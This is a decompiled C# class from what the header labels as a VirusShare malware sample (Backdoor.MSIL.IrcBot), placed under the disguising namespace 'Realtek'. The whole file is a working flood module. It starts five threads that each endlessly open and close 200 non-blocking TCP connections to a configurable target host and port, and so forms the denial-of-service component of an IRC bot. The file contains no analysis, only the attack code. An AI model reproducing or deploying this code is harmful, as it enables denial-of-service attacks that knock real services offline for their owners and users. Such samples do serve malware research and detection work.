// Decompiled with JetBrains decompiler
// Type: Realtek.Syn
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Realtek
{
  internal class Syn
  {
    private static ThreadStart[] _floodingJob;
    private static Thread[] _floodingThread;
    private static IPEndPoint _ipEo;
    private static Syn.SendSyn[] _synClass;
    public static string Host;
    public static bool IsEnabled;
    public static int Port = 80;
    public static int SuperSynSockets = 200;
    public static int Threads = 5;

    public static void StartSuperSyn()
    {
      try
      {
        Syn._ipEo = new IPEndPoint(Dns.GetHostEntry(Syn.Host).AddressList[0], Syn.Port);
      }
      catch
      {
        Syn._ipEo = new IPEndPoint(IPAddress.Parse(Syn.Host), Syn.Port);
      }
      Syn._floodingThread = new Thread[Syn.Threads];
      Syn._floodingJob = new ThreadStart[Syn.Threads];
      Syn._synClass = new Syn.SendSyn[Syn.Threads];
      for (int index = 0; index < Syn.Threads; ++index)
      {
        Syn._synClass[index] = new Syn.SendSyn(Syn._ipEo, Syn.SuperSynSockets);
        Syn._floodingJob[index] = new ThreadStart(Syn._synClass[index].Send);
        Syn._floodingThread[index] = new Thread(Syn._floodingJob[index]);
        Syn._floodingThread[index].Start();
      }
      Syn.IsEnabled = true;
    }

    public static void StopSuperSyn()
    {
      for (int index = 0; index < Syn.Threads; ++index)
      {
        try
        {
          Syn._floodingThread[index].Abort();
          Syn._floodingThread[index] = (Thread) null;
          Syn._floodingJob[index] = (ThreadStart) null;
          Syn._synClass[index] = (Syn.SendSyn) null;
        }
        catch
        {
        }
      }
      Syn.IsEnabled = false;
    }

    private class SendSyn
    {
      private Socket[] _sock;
      private IPEndPoint ipEo;
      private int SuperSynSockets;

      public SendSyn(IPEndPoint ipEo, int superSynSockets)
      {
        this.ipEo = ipEo;
        this.SuperSynSockets = superSynSockets;
      }

      private static void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
        while (true)
        {
          try
          {
            this._sock = new Socket[this.SuperSynSockets];
            for (int index = 0; index < this.SuperSynSockets; ++index)
            {
              this._sock[index] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this._sock[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(Syn.SendSyn.OnConnect);
              this._sock[index].BeginConnect((EndPoint) this.ipEo, callback, (object) this._sock[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.SuperSynSockets; ++index)
            {
              if (this._sock[index].Connected)
                this._sock[index].Disconnect(false);
              this._sock[index].Close();
              this._sock[index] = (Socket) null;
            }
            this._sock = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.SuperSynSockets; ++index)
            {
              try
              {
                if (this._sock != null)
                {
                  if (this._sock[index].Connected)
                    this._sock[index].Disconnect(false);
                  this._sock[index].Close();
                  this._sock[index] = (Socket) null;
                }
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
